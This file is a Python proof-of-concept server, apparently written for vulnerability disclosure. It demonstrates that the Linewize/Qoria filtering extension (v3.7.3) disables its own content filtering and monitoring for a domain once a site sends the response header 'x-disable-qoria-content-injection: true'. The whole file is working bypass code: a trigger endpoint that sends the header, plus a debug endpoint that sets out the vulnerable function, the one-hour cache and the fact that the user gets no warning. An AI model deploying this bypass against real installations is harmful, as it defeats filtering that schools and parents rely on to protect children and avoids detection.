#!/usr/bin/env python3
"""
Linewize HTTP Header Vulnerability Server
Demonstrates the HTTP header bypass vulnerability where the extension
checks for 'x-disable-qoria-content-injection' header in responses.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from urllib.parse import urlparse, parse_qs
import sys

class VulnerabilityHandler(BaseHTTPRequestHandler):
    """HTTP Request Handler for Linewize vulnerability PoC"""
    
    def do_GET(self):
        """Handle GET requests"""
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        
        # Serve the main PoC page
        if path == '/' or path == '/index.html':
            self.serve_poc_page()
        # Endpoint that sends the disable header
        elif path == '/disable':
            self.trigger_vulnerability()
        # Test endpoint to check headers are being sent
        elif path == '/test':
            self.test_endpoint()
        # Debug endpoint
        elif path == '/debug':
            self.debug_endpoint()
        else:
            self.send_error_response(404, 'Not found')
    
    def serve_poc_page(self):
        """Serve the main PoC HTML page"""
        html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Linewize Vulnerability Server</title>
    <style>
        body { font-family: monospace; margin: 20px; background: #f0f0f0; }
        .container { background: white; padding: 20px; border-radius: 5px; }
        h1 { color: #667eea; }
        code { background: #eee; padding: 2px 5px; }
        button { padding: 10px 20px; cursor: pointer; margin: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Linewize Vulnerability PoC Server</h1>
        <p>Server is running on: <code>http://localhost:8080</code></p>
        
        <h2>Vulnerable Endpoints:</h2>
        <ul>
            <li><code>/disable</code> - Sends x-disable-qoria-content-injection: true header</li>
            <li><code>/test</code> - Test endpoint to verify header transmission</li>
            <li><code>/debug</code> - Debug information</li>
        </ul>
        
        <h2>How it works:</h2>
        <ol>
            <li>Client requests /disable endpoint</li>
            <li>Server responds with header: <code>x-disable-qoria-content-injection: true</code></li>
            <li>Linewize extension processes response in onBeforeHeadersDynamicHeaders()</li>
            <li>Header is cached in customHeaderCache for 1 hour</li>
            <li>When content script checks CHECK_DISABLE_CONTENT_SCRIPT, it finds the header</li>
            <li>Extension returns true, disabling content injection</li>
            <li>Page loads without filtering or monitoring</li>
        </ol>
        
        <h2>Test the vulnerability:</h2>
        <button onclick="fetch('/disable').then(r => alert('Request sent! Status: ' + r.status))">Click to trigger</button>
        
        <script>
            console.log('[LZH] Vulnerability PoC Server Ready');
        </script>
    </div>
</body>
</html>"""
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', len(html_content))
        self.end_headers()
        self.wfile.write(html_content.encode())
        print(f"[*] Served PoC page to {self.client_address[0]}")
    
    def trigger_vulnerability(self):
        """
        Endpoint that sends the vulnerable HTTP header.
        This demonstrates how websites can disable Linewize without code modification.
        """
        response_body = json.dumps({
            "status": "vulnerability_triggered",
            "message": "The x-disable-qoria-content-injection header has been sent",
            "header_sent": "x-disable-qoria-content-injection: true",
            "cache_duration": "1 hour (3600000ms)",
            "affected_scope": "current domain",
            "impact": "Content injection disabled until cache expires",
            "vulnerable_function": "isContentInjectionDisabled()",
            "vulnerable_file": "background.bundle.js"
        })
        
        print(f"[+] VULNERABILITY TRIGGERED: Sending disable header to {self.client_address[0]}")
        print(f"[+] Header: x-disable-qoria-content-injection: true")
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        # THIS IS THE VULNERABLE HEADER - Extension checks for this and disables itself!
        self.send_header('x-disable-qoria-content-injection', 'true')
        self.send_header('Content-Length', len(response_body))
        self.send_header('Cache-Control', 'no-cache, no-store')
        self.end_headers()
        self.wfile.write(response_body.encode())
    
    def test_endpoint(self):
        """Test endpoint to verify the server is working"""
        response_body = json.dumps({
            "server": "Linewize Vulnerability PoC Server",
            "status": "online",
            "endpoint": self.path,
            "method": self.command,
            "client_ip": self.client_address[0],
            "vulnerability": "HTTP Header Bypass",
            "header_being_tested": "x-disable-qoria-content-injection"
        })
        
        print(f"[*] Test endpoint accessed by {self.client_address[0]}")
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Length', len(response_body))
        self.end_headers()
        self.wfile.write(response_body.encode())
    
    def debug_endpoint(self):
        """Debug endpoint with vulnerability information"""
        debug_info = {
            "vulnerability_type": "HTTP Header Bypass",
            "vulnerable_header": "x-disable-qoria-content-injection",
            "vulnerable_function": "isContentInjectionDisabled()",
            "vulnerable_file": "background.bundle.js",
            "affected_extension": "Linewize v3.7.3 (Manifest V3)",
            "cache_location": "customHeaderCache",
            "cache_ttl_ms": 3600000,
            "cache_ttl_human": "1 hour",
            "header_check_code": {
                "description": "The extension checks for this exact header in cached verdicts",
                "logic": "header.name.toLowerCase() === 'x-disable-qoria-content-injection' && header.value.toLowerCase() === 'true'",
                "case_sensitive": False,
                "required_value": "true"
            },
            "trigger_point": "content_script.CHECK_DISABLE_CONTENT_SCRIPT message",
            "message_handler": "background.contentScriptMessageHandler()",
            "call_chain": [
                "1. Content script sends CHECK_DISABLE_CONTENT_SCRIPT message",
                "2. Background receives message in contentScriptMessageHandler()",
                "3. Calls isContentInjectionDisabled(url)",
                "4. Checks customHeaderCache for matching domain",
                "5. Looks for header 'x-disable-qoria-content-injection' with value 'true'",
                "6. If found, returns true",
                "7. Content script receives true and skips initialization",
                "8. Page loads without filtering or monitoring"
            ],
            "impact": "Complete bypass of content filtering on affected domain",
            "detectability": "No user warning or indication shown",
            "requirements": [
                "Website must be able to send HTTP response headers",
                "Header must match exact name (case-insensitive)",
                "Header value must be 'true' (case-insensitive)",
                "No administrative authentication required"
            ]
        }
        
        response_body = json.dumps(debug_info, indent=2)
        print(f"[*] Debug info sent to {self.client_address[0]}")
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Length', len(response_body))
        self.end_headers()
        self.wfile.write(response_body.encode())
    
    def send_error_response(self, status_code, message):
        """Send an error response"""
        response_body = json.dumps({
            "error": message,
            "status": status_code
        })
        
        self.send_response(status_code)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Length', len(response_body))
        self.end_headers()
        self.wfile.write(response_body.encode())
    
    def log_message(self, format, *args):
        """Override logging to show custom format"""
        print(f"[HTTP] {self.address_string()} - {format % args}")


def run_server(host='localhost', port=8080):
    """Start the vulnerability demonstration server"""
    server_address = (host, port)
    httpd = HTTPServer(server_address, VulnerabilityHandler)
    
    print("""
╔═══════════════════════════════════════════════════════════════╗
║        Linewize HTTP Header Vulnerability PoC Server          ║
║                                                               ║
║  Demonstrates: x-disable-qoria-content-injection bypass       ║
║  Extension: Linewize v3.7.3 (Manifest V3)                    ║
║  Vulnerability: HTTP Response Header Injection                ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    print(f"[+] Starting server on http://{host}:{port}")
    print(f"[+] Server ready to send vulnerable headers")
    print(f"\n[*] Available endpoints:")
    print(f"    - http://{host}:{port}/ - PoC page")
    print(f"    - http://{host}:{port}/disable - VULNERABILITY TRIGGER (sends disable header)")
    print(f"    - http://{host}:{port}/test - Test functionality")
    print(f"    - http://{host}:{port}/debug - Debug information")
    print(f"\n[*] Press Ctrl+C to stop server\n")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")
        httpd.server_close()
        print("[!] Server stopped")
        sys.exit(0)


if __name__ == '__main__':
    run_server()
